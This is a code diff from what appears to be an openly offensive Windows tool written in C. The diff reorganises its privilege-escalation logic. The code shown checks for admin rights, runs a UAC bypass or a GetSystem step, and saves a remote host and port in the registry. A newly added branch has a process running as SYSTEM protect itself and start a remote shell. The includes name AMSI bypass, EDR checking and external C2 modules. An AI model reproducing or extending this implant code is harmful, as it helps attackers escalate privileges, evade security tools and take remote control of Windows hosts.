@@ -6,11 +6,12 @@
 #include "Message.h"
 
 #include "RunAs.h"
+#include "GetSystem.h"
+#include "PrivEsc.h"
 
 #include "DropFile.h"
 #include "CheckSystem.h"
-#include "BypassUac.h"
-#include "GetSystem.h"
+
 #include "ProtectProcess.h"
 #include "EDRChecker.h"
 #include "BypassAMSI.h" 
@@ -21,56 +22,11 @@
 #include "csExternalC2.h"
 
 
+
 #pragma comment(lib, "Userenv.lib")
 #pragma comment(lib, "Ws2_32.lib")
 #pragma comment(lib, "Wininet.lib")
 
-
-//#pragma warning(disable:4996)
-
-
-
-BOOL initWSAS() {
-    WSADATA wsaData;
-    int WSAStartupResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
-    if (WSAStartupResult != 0) {
-        printf("[x] WSAStartup failed: %d.\n", WSAStartupResult);
-        return FALSE;
-    }
-    return TRUE;
-}
-
-
-BOOL PrivEsc(Arguments listAgrument) {
-    char portStr[12];
-    _itoa_s(listAgrument.port, portStr, sizeof(portStr), 10);
-
-    if (IsRunAsAdmin()) {
-        printMsg(STATUS_INFO, LEVEL_DEFAULT, "Process running with admin priv !\n");
-        if (!isArgHostSet() && !SaveRHostInfo(listAgrument.host, portStr)) {
-            printMsg(STATUS_INFO, LEVEL_DEFAULT, "Error to add the reg key for host/port!\n");
-            return FALSE;
-        }else
-            GetSystem();
-    } else {
-        printMsg(STATUS_WARNING, LEVEL_DEFAULT, "Process not running with admin priv\n");
-        if (IsUserInAdminGroup()) {
-            printMsg(STATUS_INFO, LEVEL_DEFAULT, "User is in the admin group\n");
-            char* CurrentProcessPath = (char*)calloc(MAX_PATH, 1);
-            if (CurrentProcessPath != NULL) {
-                if (GetModuleFileNameA(0, CurrentProcessPath, MAX_PATH) != 0) {
-                    if (RunUacBypass(CurrentProcessPath, listAgrument.host, portStr, listAgrument.UacBypassTec, listAgrument.wincatDefaultDir))
-                        printMsg(STATUS_OK, LEVEL_DEFAULT, "UAC Bypass worked !\n");
-                    else
-                        printMsg(STATUS_ERROR, LEVEL_DEFAULT, "UAC Bypass failed");
-                }
-                free(CurrentProcessPath);
-            }
-        } else
-            printMsg(STATUS_ERROR, LEVEL_DEFAULT, "User is no in the admin group");
-    }
-    return TRUE;
-}
 
 BOOL CopyWinNC(const char* wincatDefaultPath) {
     BOOL retVal = FALSE;
@@ -84,7 +40,6 @@ BOOL CopyWinNC(const char* wincatDefaultPath) {
     }
     return retVal;
 }
-
 
 int wmain(int argc, WCHAR* argv[]){
     Arguments listAgrument;
@@ -120,9 +75,17 @@ int wmain(int argc, WCHAR* argv[]){
 
 
     if (!GetArguments(argc, argv, &listAgrument)) {
-        if (IsRunAsAdmin() && isArgHostSet()) {
-            printMsg(STATUS_WARNING, LEVEL_DEFAULT, "Process running with admin priv !\n");
-            GetSystem();
+        if (IsRunAsAdmin()) {
+            if (isArgHostSet()) {
+                printMsg(STATUS_WARNING, LEVEL_DEFAULT, "Process running with admin priv !\n");
+                GetSystem();
+            } else if(IsRunAsSystem()){
+                if (GetInfoPipeSystem(&listAgrument)){
+                    ProtectProcess();
+                    initWSAS();
+                    RunShell(listAgrument);
+                }
+            }
         }
         return TRUE;
     }
